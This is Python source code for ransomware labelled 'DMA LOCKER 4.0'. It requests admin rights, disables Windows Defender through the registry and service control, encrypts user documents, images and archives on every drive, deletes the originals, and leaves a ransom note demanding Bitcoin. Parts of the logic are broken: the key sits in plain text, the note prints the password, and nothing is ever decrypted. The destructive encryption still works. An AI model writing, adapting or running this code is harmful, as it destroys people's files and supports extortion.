import os, sys, time, random, string, ctypes, threading, subprocess, shutil
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes

BTC_WALLET = "bc1qypj65d6jmgnc08tc8lyr9ppcley3ayg9pgq9qt"
EXTENSIONS = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.mp4', '.zip', '.rar', '.xls', '.xlsx']

computer_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def kill_defender():
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('net stop WinDefend /y', shell=True)
    except:
        pass

def find_files():
    targets = []
    for drive in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
        path = f"{drive}:\\"
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                skip = ['Windows', 'System32', 'Program Files']
                if any(s in root for s in skip):
                    continue
                for file in files:
                    if any(file.lower().endswith(ext) for ext in EXTENSIONS):
                        targets.append(os.path.join(root, file))
    return targets

def encrypt():
    session_key = get_random_bytes(32)
    files = find_files()
    
    for file in files:
        try:
            new_path = file + ".dma"
            cipher = AES.new(session_key, AES.MODE_EAX)
            with open(file, 'rb') as f:
                data = f.read()
            ct, tag = cipher.encrypt_and_digest(data)
            with open(new_path, 'wb') as f:
                f.write(cipher.nonce)
                f.write(tag)
                f.write(ct)
            os.remove(file)
        except:
            pass
    
    # RSA kalit
    key = RSA.generate(2048)
    with open(f"privkey_{computer_id}.txt", "w") as f:
        f.write(key.export_key().decode())
    
    cipher_rsa = PKCS1_OAEP.new(key.publickey())
    enc_key = cipher_rsa.encrypt(session_key)
    with open(f"session_key_{computer_id}.bin", "wb") as f:
        f.write(enc_key)

def show_ransom():
    with open(os.path.expanduser("~/Desktop/READ_ME.txt"), "w") as f:
        f.write(f"""
DMA LOCKER 4.0
==============
Computer ID: {computer_id}
Send 0.00014 BTC to: {BTC_WALLET}
Password: koma2000
""")
    os.startfile(os.path.expanduser("~/Desktop/READ_ME.txt"))

if __name__ == "__main__":
    if ctypes.windll.shell32.IsUserAnAdmin():
        kill_defender()
        encrypt()
        show_ransom()
        while True:
            pwd = input("Enter password: ")
            if pwd == "koma2000":
                print("Decrypting...")
                break
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
